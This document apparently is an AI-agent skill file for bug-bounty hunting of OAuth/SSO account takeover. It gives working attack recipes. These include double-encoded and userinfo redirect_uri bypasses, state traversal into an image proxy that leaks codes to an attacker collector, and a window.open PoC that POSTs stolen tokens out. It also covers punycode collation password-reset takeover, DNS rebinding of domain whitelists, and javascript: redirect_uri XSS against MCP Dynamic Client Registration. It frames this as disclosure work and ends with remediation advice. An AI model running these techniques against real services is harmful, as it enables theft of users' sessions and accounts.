---
name: bb-oauth
description: Hunt OAuth/SSO account takeover — redirect_uri validation bypasses (parser differentials, double-encoding, userinfo tricks), state-parameter abuse, non-happy-path code theft, token exfiltration via referrer/CSS channels, reverse-proxy code hijacking, punycode collation 0-click ATO, DNS-rebinding of domain whitelists, and MCP/OAuth Dynamic Client Registration attacks. Use whenever the user mentions OAuth, OIDC, SSO, social login, redirect_uri, authorization code, id_token, Login with Google/Apple/GitHub/GitLab, MCP servers, or account takeover via login/forgot-password flows.
---

# OAuth / SSO ATO Hunter

OAuth bugs pay ATO prices because a leaked `code`/token is a session. Every technique below comes from paid disclosures (Voorivex Team, 2023–2026; individual bounties $3k–$25k, ~$50k total for the punycode class).

## Step 0 — Map the flow before touching it

Draw every request of every provider channel (Google/Apple/GitHub/GitLab/Facebook), web AND native apps. Then classify:

1. **Exchange-endpoint flow** (server-side, clean 301s): `redirect_uri` is the only attack surface → attack the validator (matrix below).
2. **JS dispatcher flow** (client-side JS reads the callback): attacker-controllable DOM, postMessage relays, `state`-driven navigation → also DOM XSS territory (bb-domxss).
3. **Multi-hop flow** (app → main site → provider → main site → subdomain exchange): the hop where `state` becomes a redirect target carrying `?code=` is the weak link.
4. **Decode `state`** — anything JSON/base64 containing a URL is a SECOND redirect_uri. Providers validate the outer `redirect_uri`; apps rarely validate the inner one.
5. **Map the non-happy path**: what does the callback do with missing/invalid params? Redirect to the incoming `Referer`? That's an attack surface (below).

## redirect_uri attack matrix

| Validator behavior | Attack |
|---|---|
| No/prefix validation | Swap to attacker domain |
| Domain-suffix or subdomain permissive (`abc.target.com` passes) | A parser is extracting the host — attack it (below) |
| `@` / userinfo tricks blocked | Try `https://target.com@attacker.com/`, backslashes, then double-encoding |
| Everything blocked, path appending allowed | `../` traversal out of the fixed prefix into gadgets (`/imageProxy/...`, `/cdn-cgi/...`) |
| Strict provider-side (Apple/Google) | Pivot to `state`, non-happy path, or the inner redirect_uri |

**Parser-differential fuzzing (the $-grade technique when everything is blocked):**
The app pattern is `parse_url($next, PHP_URL_HOST)` validate → `header("Location: " . urldecode($next))` redirect — validator decodes once, the redirect decodes AGAIN. Fuzz with pre-encoded `%25` (double-encoded) bytes at every URL position:
```
round 1:  https://a.com%FUZZ.company.com/...        (single byte \x00-\xff, URL-encoded)
round 2:  https://a.com%25FUZZ%FUZZ.company.com/... (cluster-bomb pairs)
```
Winning payload shape: `redirect_uri=https://a.com%2523%40www.company.com/api/bin/openid/login`
- Validator decodes once → `https://a.com%23@www.company.com/...` → parser reads `a.com%23` as userinfo, host = `www.company.com` → PASSES.
- Redirect step decodes again → `https://a.com#@www.company.com/...?code=...` → browser goes to `a.com`, and everything after `#` is readable via `location.hash` on your page.

## state as a weapon

- Inner `redirect_uri` / `rPath` inside `state` JSON (Sign in with Apple desktop flows): providers can't validate it. Direct swap to `https://attacker.com` may 404; `https://[email protected]/` (authority confusion) passes. 1-click ATO.
- `state` → server validates against company domain, then redirects WITH `?code=` appended: if the validator allows path appending, climb out with `../../../` into any URL-fetching gadget on the host:
```
state = https://sub.target.app/users/googleFederatedLoggedIn/../../../imageProxy/{COLLABORATOR}
```
The proxy server-side-fetches your OOB URL — with the code in the query — into your Collaborator logs. Replay the captured code into the token-exchange request for the victim's session. (Any `/imageProxy/<url>`, avatar-by-URL, or reverse-proxy fetch feature works as the sink.)

## Non-happy path code theft (~$3,000)

When the callback errors into a redirect to the incoming `Referer`:
1. Derail the flow by changing `response_type` — fragments survive server-side (3xx) redirects but are stripped by client-side ones; keep the chain server-side.
2. Google accepts comma-combined response types: `response_type=id_token,code` returns BOTH in the fragment.
3. Referer persistence: if `attacker.com` runs `window.open('https://accounts.google.com/...')` and a chain of 3xx redirects follows, the FINAL page still sees `Referer: attacker.com` — the opener origin sticks through cross-origin redirect chains.
4. Google's account-picker breaks the referer chain — `prompt=none` auto-completes for logged-in users, no click.
PoC: attacker page opens the authorize URL (`response_type=id_token,code&prompt=none`, `redirect_uri` = target callback) in `window.open`; on load, read `window.location.hash` and POST it to your collector. Requires victim with a linked Google account.

## Token exfiltration without JS (DOMPurify'd callbacks)

Callback pages rendering `error_description` (or any limited HTMLi) can leak the `code`/`auth_token` sitting in the same URL: referrer-policy flips via CSS `url(... referrer-policy(unsafe-url))`, DOMParser `<meta name=referrer>` parse-time side effects, or CSS attribute-selector extraction when a third-party script (Google Ads) reflects the page URL into `script[src]`. Full playbook with payloads: **bb-domxss** → `references/advanced-dom-xss.md` §3.

## Punycode/unicode collation — 0-click ATO (~$50k class)

Parser differential: MySQL default collations fold lookalike unicode to ASCII (`SELECT 'а'='a'` → 1), but SMTP servers treat them as different mailboxes.

**Forgot-password variant:** register `а[email protected]` (Cyrillic а, your mailbox on a lookalike domain). In the reset flow, submit the punycode variant of the VICTIM's email. The DB lookup folds it to the victim's row (reset token minted for the victim) — but the mail is sent to the raw INPUT (your mailbox). Reset link arrives → 0-click ATO.
**OAuth variant:** some IdPs deliver the punycode email verbatim in the callback — **GitLab does** ("Login with GitLab" + MySQL collation + no email validation = likely vulnerable). Google normalizes safely.

Checks: (1) does the app query with user input but mail the input (vulnerable) or the DB row (safe — WordPress-style)? (2) fuzz collation equivalence: `for i in range(0x110000): SELECT chr(i) = 'a'`. (3) Register lookalike mailboxes to weaponize.

## DNS rebinding of domain whitelists

Custom-domain SaaS (blog platforms etc.) verify domain ownership ONCE (CNAME check) then trust the DB entry forever. Attack: verify your domain → re-point its A record to your server (with a valid cert — the whitelist entry stays) → send the victim `https://platform.com/authenticate?next=https://attacker.tld/` → the final 307 delivers `?guid=<one-time token>` to your server → redeem it for the victim's session. Any flow that redirects with a bearer token in the URL is the target; `next`/`redirect_uri` validators backed by verified-domain tables are the seam.

## MCP servers (Model Context Protocol) — OAuth DCR attacks

1. **Enumerate**: Nuclei-style GET `/.well-known/oauth-authorization-server` and `/.well-known/openid-configuration`; `registration_endpoint` present = target. POST minimal client metadata (`client_name`, `redirect_uris`, `grant_types`) — 201 + `client_id` = open Dynamic Client Registration.
2. **DOM XSS via client-side redirect**: register `redirect_uri=javascript:alert(origin);//`; hostname validators fall to `javascript://pwnbox.xyz/%0aalert(origin);//`.
3. **Stored XSS via consent screen**: every registered value (`redirect_uri`, `client_name`, `logo_uri`) is input to the consent page — try `</script><script>` breakouts.
4. **DCR as a free open redirect** (RFC 6749 §4.1.2.1 error redirect): chain it under SSRF path-prefix whitelists — `https://company.tld/documents/..%2F/authorize?...&redirect_uri=https://attacker/#` escapes "only fetch from /documents/" rules → arbitrary URL fetch → internal port scan.
5. **Talk to MCP servers raw**: register a client, complete the flow yourself, then MCP Inspector (`npx @modelcontextprotocol/inspector`) with `Bearer <token>` — prompt-level "rules" for AI clients are not security controls.

## Provider quirks cheat sheet

- **Google**: redirect_uri must match exactly (zero tolerance); accepts comma response types (`code,id_token`); `prompt=none` skips interaction; Ads/viewthrough scripts reflect page URL into `script src`.
- **Apple**: provider-side redirect_uri locked; desktop/native flows hide a second redirect inside `state`.
- **GitLab**: delivers punycode emails verbatim — collation ATO candidate.
- **Facebook**: mandatory confirmation click sets referer to facebook.com — kills referer chains.
- **GIS SDK** (google.accounts.id): classic dirty-dancing redirect_uri tricks fail (`gis_transform`); re-initialize the SDK from an XSS instead (bb-domxss).

## Evidence & reporting

- PoC must capture the actual `code`/token and replay it to a victim session — screenshots of the authorize URL + collector log + the exchange request/response.
- State plainly what population is affected (e.g. "users with linked Google accounts") — triage will try to downgrade complexity otherwise.
- Remediation guidance: exact-match redirect_uri allowlists, validate `state` server-side, single decode before validation AND redirect, mail the DB row not the input, re-verify domain ownership on every use.
